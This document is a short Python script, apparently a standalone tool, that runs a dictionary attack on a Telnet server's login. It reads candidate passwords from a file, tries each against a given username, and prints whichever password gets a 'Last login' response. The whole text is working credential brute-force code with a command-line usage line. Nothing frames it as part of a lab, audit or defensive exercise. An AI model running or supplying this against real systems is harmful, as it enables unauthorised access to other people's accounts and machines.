# Attacks a Telnet server with a dictionary attack
# Usage: telnet_bruteforce.py <target> <user> <dictionary>

import telnetlib
import sys

def telnet_bruteforce(target, user, dictionary):
    with open(dictionary, "r") as file: # Open the dictionary file
        for password in file:
            password = password.strip("\n") # Remove the newline character
            try:
                tn = telnetlib.Telnet(target) # Connect to the Telnet server
                tn.read_until(b"login: ")  # Wait for the login prompt
                tn.write(user.encode() + b"\n") # Send the username
                tn.read_until(b"Password: ") # Wait for the password prompt
                tn.write(password.encode() + b"\n") # Send the password
                index, _, _ = tn.expect([b"Login incorrect", b"Last login"], 3) # Wait for the response (index 0 is incorrect, index 1 is correct)
                if index == 1:
                    print(f"Password found: {password}") # If the password is correct, print it
                    break
                else:
                    tn.close()
                    continue
            except EOFError: # If the connection is closed, break the loop
                print("Connection closed")
                break
        else:
            print("Password not found")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: telnet_bruteforce.py <target> <user> <dictionary>")
        sys.exit(1)
    telnet_bruteforce(sys.argv[1], sys.argv[2], sys.argv[3])
